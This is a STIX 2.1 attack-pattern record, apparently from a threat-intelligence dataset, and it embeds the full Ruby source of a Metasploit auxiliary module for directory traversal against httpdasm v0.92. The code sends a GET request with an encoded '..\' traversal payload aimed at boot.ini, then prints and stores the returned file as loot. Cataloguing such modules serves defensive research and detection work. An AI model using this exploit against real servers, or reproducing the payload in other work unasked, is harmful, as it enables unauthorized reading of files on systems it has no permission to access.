{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--374a9151-f9f5-4a7b-9bb6-2fa6251f6e43",
    "created": "2024-08-14T16:30:03.714735Z",
    "modified": "2024-08-14T16:30:03.714739Z",
    "name": "Httpdasm Directory Traversal",
    "description": " This module allows for traversing the file system of a host running httpdasm v0.92. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/httpdasm_directory_traversal.rb",
            "external_id": "httpdasm_directory_traversal.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Httpdasm Directory Traversal',\n      'Description'    => %q{\n        This module allows for traversing the file system of a host running httpdasm v0.92.\n      },\n      'Author'         =>\n        [\n          'John Leitch', # EDB POC\n          'Shelby Pace' # Metasploit Module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['EDB', '15861']\n        ]\n    ))\n\n    register_options(\n    [\n      OptString.new('TARGETURI', [true, 'Path to traverse to', '%2e%2e%5c' * 8 + 'boot.ini'])\n    ])\n\n  end\n\n  def run\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path)\n    })\n\n    if res && res.code == 200\n      print_status(res.body)\n      path = store_loot('httpdasm.file', 'application/octet-stream', rhost, res.body)\n    else\n      if res\n        print_error(\"Unexpected response from server: #{res.code}\")\n      else\n        print_error(\"The server timed out.\")\n      end\n    end\n  end\nend\n"
}